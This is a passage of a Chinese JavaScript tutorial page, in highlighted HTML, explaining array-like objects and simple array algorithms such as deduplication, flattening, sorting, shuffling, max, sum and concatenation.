      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> end<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
           result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
      <span class="token punctuation">}</span>  
      <span class="token keyword">return</span> result<span class="token punctuation">;</span>  
 <span class="token punctuation">}</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h5 id="类数组"><a href="#类数组" class="header-anchor">#</a> 类数组</h5> <p><strong>属性特点</strong></p> <ol><li><strong>必须有length属性</strong>;</li> <li>类数组不是数组，<strong>通过 <code>Array.isArray()</code> 会返回 <code>false</code></strong>;</li> <li>类数组通过 <code>Array.from</code> 可以转换为数组;</li> <li>属性要为索引（数字）属性；</li></ol> <p><strong>经常遇见的类数组</strong></p> <ul><li>字符串
<ul><li><strong>唯一的原生类数组</strong></li></ul></li> <li>arguments
<ul><li>arguments完全可以<strong>使用<code>...args</code>代替，这样不定参数就是真数组</strong></li> <li>arguments在箭头函数中被移除</li></ul></li> <li>DOM中nodeList;</li></ul> <p><strong>使类数组拥有数组的方法</strong></p> <p><strong>方式一</strong>：<code>Array.prototype.slice.apply(argument)</code>; 理论上来说这个比较快，<strong>直接在原型上查找slice方法</strong>;但实际上比较慢</p> <p><strong>方式二</strong>：<code>[].slice.apply(arguments)</code>; 理论上来说这个比较慢;实际上比较快；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//Object.prototype.toString.call(arguments)//[object Arguments]</span>
<span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span> <span class="token comment">//arguments是类数组(伪数组)</span>
<span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span>
Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span>
<span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//方法一</span>
<span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//方法二</span>
<span class="token comment">//方法三：遍历法</span>
<span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
  args<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arguments<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//通用函数</span>
<span class="token keyword">var</span> <span class="token function-variable function">toArray</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">try</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>len <span class="token operator">=</span> s<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token comment">//arr.push(s[i]);</span>
      arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//据说这样比push快</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> arr<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// return Array.prototype.slice.call(arguments,1); //取第一个到最后一个；</span>
  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//跟上面方法一样； 就是数组的.slice(1)</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;b&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;c&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;d&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//[ 'b', 'c', 'd' ]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h4 id="_8-数组简单算法"><a href="#_8-数组简单算法" class="header-anchor">#</a> 8:数组简单算法</h4> <h5 id="去重"><a href="#去重" class="header-anchor">#</a> <strong>去重</strong></h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//[1,2,3,4]</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment">//[1,2,3,4]</span>

<span class="token comment">//方法一：普通遍历筛选法；</span>
<span class="token comment">//方法二：set方法; ..解构[...]等同于Array.from()</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">]</span>； <span class="token comment">//Array.from(new Set(array))</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token string">'ababbc'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment">// &quot;abc&quot; //上面的方法也可以用于，去除字符串里面的重复字符。</span>
<span class="token comment">//方式三：filter及map方法特性；</span>
<span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token operator">!</span>res<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">//方式四：lodash方法;</span>
_<span class="token punctuation">.</span><span class="token function">uniqBy</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> <span class="token punctuation">[</span>iteratee<span class="token operator">=</span>_<span class="token punctuation">.</span>identity<span class="token punctuation">]</span><span class="token punctuation">)</span>；  _<span class="token punctuation">.</span><span class="token function">compact</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span>，
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h5 id="扁平化n维数组"><a href="#扁平化n维数组" class="header-anchor">#</a> <strong>扁平化n维数组</strong></h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">//[1,2,3]</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">//[1,2,3,4,5]</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//'1,2,3,4,5'</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token number">Infinity</span><span class="token punctuation">)</span> <span class="token comment">//[1,2,3,4...n]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h5 id="最大值"><a href="#最大值" class="header-anchor">#</a> <strong>最大值</strong></h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//4</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token operator">...</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//4</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//4</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>
  arr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">prev<span class="token punctuation">,</span> cur<span class="token punctuation">,</span> curIndex<span class="token punctuation">,</span> arr</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> cur<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//4</span>

<span class="token comment">//两个功能是一样的；比如:func是Math.max的话；</span>
<span class="token comment">//return func(..._args);</span>
<span class="token comment">//return func.apply(null, _args);</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h5 id="排序"><a href="#排序" class="header-anchor">#</a> <strong>排序</strong></h5> <blockquote><p>a-b:默认升，b-a：降</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> a <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 2,3,4],默认是升序</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> b <span class="token operator">-</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [4,3,2,1] 降序</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h5 id="实现数组的随机排序"><a href="#实现数组的随机排序" class="header-anchor">#</a> <strong>实现数组的随机排序</strong></h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//推荐，简洁；</span>
<span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0.5</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h5 id="取出最大的三个数的下标"><a href="#取出最大的三个数的下标" class="header-anchor">#</a> <strong>取出最大的三个数的下标</strong></h5> <p>首先记录之前下标在排序，这样取出前三个就行了，然后在拿到下标就可以了; 后面循环取出前三个即可</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span>
<span class="token keyword">function</span> <span class="token function">retrunAarr</span><span class="token punctuation">(</span><span class="token parameter">arr1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> arr2 <span class="token operator">=</span> arr1<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>item<span class="token punctuation">,</span> index<span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> arr2
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">retrunAarr</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// [ [ 98, 3 ],</span>
<span class="token comment">//   [ 87, 4 ],</span>
<span class="token comment">//   [ 65, 2 ],</span>
<span class="token comment">//   [ 35, 5 ],</span>
<span class="token comment">//   [ 10, 7 ],</span>
<span class="token comment">//   [ 7, 6 ],</span>
<span class="token comment">//   [ 6, 8 ],</span>
<span class="token comment">//   [ 2, 1 ],</span>
<span class="token comment">//   [ 1, 0 ] ]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h5 id="找出正数组的最大差值"><a href="#找出正数组的最大差值" class="header-anchor">#</a> <strong>找出正数组的最大差值</strong></h5> <p>在这个数组里面，找到最小值及最大值，然后相减</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">getMaxProfit</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> minPrice <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> maxProfit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> currentPrice <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    minPrice <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>minPrice<span class="token punctuation">,</span> currentPrice<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> potentialProfit <span class="token operator">=</span> currentPrice <span class="token operator">-</span> minPrice<span class="token punctuation">;</span>
    maxProfit <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>maxProfit<span class="token punctuation">,</span> potentialProfit<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> maxProfit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">getMaxProfit</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//6</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h5 id="求和"><a href="#求和" class="header-anchor">#</a> <strong>求和</strong></h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">prev<span class="token punctuation">,</span> cur</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">return</span> prev <span class="token operator">+</span> cur<span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">//10 </span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h5 id="合并"><a href="#合并" class="header-anchor">#</a> <strong>合并</strong></h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">//[1,2,3,4,5,6]</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">...</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token comment">//[1,2,3,4,5,6]</span>
<span class="token keyword">let</span> arrA <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> arrB <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>
<span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>arrA<span class="token punctuation">,</span> arrB<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//arrA值为[1,2,3,4]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h5 id="求两数组中不同元素【常用】"><a href="#求两数组中不同元素【常用】" class="header-anchor">#</a> <strong>求两数组中不同元素</strong>【常用】</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>
